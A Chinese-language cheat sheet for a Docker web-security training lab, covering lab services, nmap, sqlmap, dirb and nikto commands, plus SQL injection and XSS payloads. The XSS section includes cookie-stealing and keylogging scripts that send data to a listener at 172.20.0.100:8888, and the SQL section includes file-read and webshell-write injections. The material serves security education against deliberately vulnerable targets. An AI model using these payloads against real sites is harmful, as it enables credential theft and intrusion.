# 第一周命令速查表

> 快速查找常用命令和 Payload

## 🐳 Docker 常用命令

### 容器管理

```bash
# 启动所有服务
docker-compose up -d

# 查看容器状态
docker-compose ps

# 查看所有容器（包括停止的）
docker ps -a

# 停止所有服务
docker-compose down

# 重启单个服务
docker-compose restart dvwa

# 进入容器
docker exec -it kali-tools bash
docker exec -it dvwa bash

# 查看日志
docker-compose logs dvwa
docker-compose logs -f dvwa  # 实时查看

# 查看资源使用
docker stats --no-stream

# 清理未使用资源
docker system prune -a
```

### 镜像管理

```bash
# 查看镜像
docker images

# 拉取镜像
docker-compose pull

# 删除镜像
docker rmi [镜像ID]

# 构建镜像
docker-compose build
```

### 网络管理

```bash
# 查看网络
docker network ls

# 查看网络详情
docker network inspect docker-lab_security-lab

# 查看容器IP
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' dvwa
```

---

## 🌐 服务访问地址

### 漏洞靶机

| 服务 | 地址 | 账号 | 说明 |
|------|------|------|------|
| DVWA | http://localhost:8080 | admin/password | 综合Web漏洞 |
| SQLi Labs | http://localhost:8081 | - | SQL注入专项 |
| bWAPP | http://localhost:8082 | bee/bug | 100+漏洞 |
| WebGoat | http://localhost:8083 | 需注册 | OWASP平台 |
| Juice Shop | http://localhost:3000 | - | 现代Web应用 |

### 工具和管理

| 服务 | 地址 | 说明 |
|------|------|------|
| ZAP | http://localhost:8090 | Web扫描器 |
| Portainer | http://localhost:9000 | Docker管理 |

---

## 🛠️ Kali 工具命令

### 进入 Kali 容器

```bash
# 进入容器
docker exec -it kali-tools bash

# 更新软件源
apt update

# 安装工具
apt install -y nmap sqlmap dirb nikto curl wget
```

### Nmap 扫描

```bash
# 基础扫描
nmap 172.20.0.10

# 扫描服务版本
nmap -sV 172.20.0.10

# 扫描多个端口
nmap -p 80,443,3306 172.20.0.10

# 扫描所有端口
nmap -p- 172.20.0.10

# 操作系统检测
nmap -O 172.20.0.10

# 全面扫描
nmap -A 172.20.0.10

# 扫描整个网段
nmap -sV 172.20.0.10-14

# 输出到文件
nmap -sV 172.20.0.10 -oN scan_result.txt
```

### SQLMap 使用

```bash
# 基础探测
sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=xxx; security=low" \
       --batch

# 获取所有数据库
sqlmap -u "..." --cookie="..." --dbs

# 获取当前数据库
sqlmap -u "..." --cookie="..." --current-db

# 获取表
sqlmap -u "..." --cookie="..." -D dvwa --tables

# 获取列
sqlmap -u "..." --cookie="..." -D dvwa -T users --columns

# 获取数据
sqlmap -u "..." --cookie="..." -D dvwa -T users -C user,password --dump

# 指定注入技术
sqlmap -u "..." --cookie="..." --technique=U

# 提升权限
sqlmap -u "..." --cookie="..." --privileges

# 执行SQL命令
sqlmap -u "..." --cookie="..." --sql-shell
```

### Dirb 目录扫描

```bash
# 基础扫描
dirb http://172.20.0.10

# 指定字典
dirb http://172.20.0.10 /usr/share/wordlists/dirb/big.txt

# 指定扩展名
dirb http://172.20.0.10 -X .php,.html,.txt

# 输出到文件
dirb http://172.20.0.10 -o result.txt

# 忽略证书错误
dirb http://172.20.0.10 -k
```

### Nikto Web扫描

```bash
# 基础扫描
nikto -h http://172.20.0.10

# 指定端口
nikto -h 172.20.0.10 -p 8080

# 输出格式
nikto -h http://172.20.0.10 -o result.html -Format htm

# 使用代理
nikto -h http://172.20.0.10 -useproxy http://127.0.0.1:8080
```

---

## 💉 SQL 注入 Payload

### DVWA SQL Injection (Low)

```sql
-- 1. 测试注入点
1
1'
1' or '1'='1
1' or '1'='1'--+
1' or 1=1--+

-- 2. 确定列数
1' order by 1--+
1' order by 2--+
1' order by 3--+  (报错说明只有2列)

-- 3. UNION 注入
1' union select 1,2--+

-- 4. 获取基本信息
1' union select @@version,2--+
1' union select user(),database()--+
1' union select @@datadir,2--+

-- 5. 获取数据库
1' union select 1,schema_name from information_schema.schemata--+
1' union select 1,group_concat(schema_name) from information_schema.schemata--+

-- 6. 获取表名
1' union select 1,table_name from information_schema.tables where table_schema='dvwa'--+
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'--+

-- 7. 获取列名
1' union select 1,column_name from information_schema.columns where table_name='users'--+
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'--+

-- 8. 获取用户数据
1' union select user,password from users--+
1' union select user,password from users where user='admin'--+

-- 9. 读取文件
1' union select 1,load_file('/etc/passwd')--+
1' union select 1,load_file('C:/Windows/System32/drivers/etc/hosts')--+

-- 10. 写入文件
1' union select 1,'<?php phpinfo(); ?>' into outfile '/var/www/html/test.php'--+
```

### 常用 SQL 函数

```sql
-- 系统信息
@@version          # 数据库版本
@@hostname         # 主机名
@@datadir          # 数据目录
user()             # 当前用户
database()         # 当前数据库
@@basedir          # 安装目录

-- 字符串函数
concat(str1, str2)           # 连接字符串
concat_ws(sep, str1, str2)   # 带分隔符连接
group_concat(col)            # 分组连接
char(num)                    # ASCII转字符
hex(str)                     # 转十六进制

-- 条件函数
if(condition, true, false)   # 条件判断
case when condition then true else false end

-- 信息获取
select schema_name from information_schema.schemata    # 数据库
select table_name from information_schema.tables       # 表
select column_name from information_schema.columns     # 列
```

---

## 🎨 XSS Payload

### 反射型 XSS (Reflected)

```html
<!-- 基础测试 -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>

<!-- 图片标签 -->
<img src=x onerror=alert('XSS')>
<img src=1 onerror=alert(1)>
<img src="javascript:alert('XSS')">

<!-- SVG 标签 -->
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>

<!-- 事件处理 -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>

<!-- JavaScript 伪协议 -->
<a href="javascript:alert('XSS')">click</a>
<a href="javascript:void(0)" onclick=alert('XSS')>click</a>
<iframe src="javascript:alert('XSS')">

<!-- 编码绕过 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>

-- 大小写混合
<ScRiPt>alert('XSS')</sCrIpT>
<IMG SRC=x OnErRoR=alert('XSS')>

-- 双写绕过
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

### 存储型 XSS (Stored)

```html
<!-- 基础存储型 -->
<script>alert('Stored XSS')</script>

-- 窃取 Cookie
<script>
var img = new Image();
img.src = "http://172.20.0.100:8888/?cookie=" + document.cookie;
</script>

-- 键盘记录
<script>
document.onkeypress = function(e) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://172.20.0.100:8888/?key=" + e.key, true);
  xhr.send();
}
</script>

-- 页面劫持
<script>
document.body.innerHTML = "<h1>Hacked!</h1>";
</script>

-- 加载外部JS
<script src="http://172.20.0.100:8888/evil.js"></script>
```

### 设置监听服务器

```bash
# 在 Kali 中启动简单的 HTTP 服务器
python3 -m http.server 8888

# 或使用 nc 监听
nc -lvnp 8888

# 查看接收的数据
# 访问 http://172.20.0.100:8888 可以看到请求日志
```

---

## 🔍 故障排查

### 查看容器日志

```bash
# 查看所有日志
docker-compose logs

# 查看特定服务日志
docker-compose logs dvwa
docker-compose logs kali-tools

# 实时查看日志
docker-compose logs -f dvwa

# 查看最近100行
docker-compose logs --tail=100 dvwa
```

### 网络连通性测试

```bash
# 从主机测试
ping 172.20.0.10
curl http://172.20.0.10
curl http://localhost:8080

# 从容器内测试
docker exec dvwa ping -c 3 kali-tools
docker exec kali-tools curl http://dvwa
```

### 重启服务

```bash
# 重启单个服务
docker-compose restart dvwa

# 重启所有服务
docker-compose restart

-- 完全重建
docker-compose down
docker-compose up -d
```

---

## 📝 IP 地址速查

| 容器 | IP 地址 | 服务 |
|------|---------|------|
| dvwa | 172.20.0.10 | DVWA靶机 |
| sqli-labs | 172.20.0.11 | SQL注入靶机 |
| bwapp | 172.20.0.12 | bWAPP靶机 |
| webgoat | 172.20.0.13 | WebGoat靶机 |
| juice-shop | 172.20.0.14 | Juice Shop靶机 |
| db | 172.20.0.20 | MySQL数据库 |
| redis | 172.20.0.21 | Redis缓存 |
| kali-tools | 172.20.0.100 | Kali工具容器 |
| zap-scanner | 172.20.0.101 | OWASP ZAP |
| nuclei-scanner | 172.20.0.102 | Nuclei扫描器 |
| portainer | 172.20.0.200 | Portainer管理 |
| webtop | 172.20.0.201 | Web桌面 |

---

## 🎓 学习建议

### 每日流程

1. **开始学习前**
   - 启动 Docker 环境
   - 查看今天的学习目标
   - 准备好笔记本

2. **学习过程中**
   - 边学边练
   - 记录成功的 Payload
   - 记录遇到的问题

3. **学习结束后**
   - 总结今天的收获
   - 标记未解决的问题
   - 预习明天的内容

### 调试技巧

1. **遇到问题先查日志**
   ```bash
   docker-compose logs [服务名]
   ```

2. **验证网络连通性**
   ```bash
   docker exec [容器名] ping [目标容器]
   ```

3. **确认容器状态**
   ```bash
   docker-compose ps
   docker stats --no-stream
   ```

4. **检查端口占用**
   ```bash
   netstat -ano | findstr :8080  # Windows
   lsof -i :8080                 # Linux/Mac
   ```

---

**打印这份速查表，学习时随时查阅！** 📋
